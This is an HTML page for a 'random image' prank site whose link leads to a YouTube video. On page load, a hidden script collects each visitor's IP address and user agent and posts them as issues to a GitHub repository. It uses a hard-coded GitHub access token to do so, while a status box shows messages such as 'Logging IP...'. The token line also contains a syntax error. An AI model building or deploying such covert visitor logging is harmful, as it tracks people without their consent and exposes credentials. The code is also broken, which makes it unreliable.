

<!DOCTYPE html>
<html>
  <head>
    <title>RandomMemeRollerSite</title>
    <style>
      body { 
        margin: 0; 
        font-family: "Comic Sans MS"; 
        text-align: center; 
        background-color: #f5f5f5;
      }
      p { 
        margin-top: 80px; 
        font-size: 40px; 
        color: rgb(0, 0, 0); 
      }
      button { 
        margin-top: 80px; 
        font-size: 20px; 
        font-family: "Comic Sans MS"; 
        padding: 10px 20px; 
        border: none; 
        border-radius: 8px; 
        cursor: pointer; 
        background-color: #4CAF50;
        color: white;
        transition: background-color 0.3s;
      }
      button:hover {
        background-color: #45a049;
      }
      #link { 
        margin-top: 20px; 
        display: none; 
        font-size: 18px; 
      }
      #status {
        position: fixed;
        bottom: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #ddd;
        border-radius: 5px;
        font-size: 12px;
      }
    </style>
  </head>
  <body>
    <p>In This Site You Can Get a Random image!</p>
    <button onclick="showLink()">Roll an image</button>
    <div id="link">
      <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank">
        Click here for your random image
      </a>
    </div>
    <div id="status">Initializing...</div>

    <script>
      function showLink() {
        document.getElementById("link").style.display = "block";
      }

      // Log visitor IP using GitHub Issues API
      window.addEventListener('DOMContentLoaded', async () => {
        const statusElement = document.getElementById("status");
        
        try {
          statusElement.textContent = "Getting IP...";
          
          // Get visitor IP
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          const ip = data.ip;
          
          statusElement.textContent = "Logging IP...";
          
          // Create an issue with the IP
          const response = await fetch(`https://api.github.com/repos/universal123-octo/RandomImageSite/issues`, {
            method: 'POST',
            headers: {
              'Authorization': `token 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`,`,
              'Content-Type': 'application/json',
              'Accept': 'application/vnd.github.v3+json',
              'User-Agent': 'IP-Logger'
            },
            body: JSON.stringify({
              title: `IP Log: ${new Date().toISOString()}`,
              body: `Visitor IP: ${ip}\n\nUser Agent: ${navigator.userAgent}`,
              labels: ['ip-log']
            })
          });
          
          if (response.ok) {
            statusElement.textContent = "IP logged successfully";
            setTimeout(() => {
              statusElement.style.display = 'none';
            }, 3000);
          } else {
            const error = await response.json();
            statusElement.textContent = `Error: ${error.message}`;
            console.error('GitHub API Error:', error);
          }
        } catch (err) {
          statusElement.textContent = `Error: ${err.message}`;
          console.error('Failed to log IP:', err);
        }
      });
    </script>
  </body>
</html>
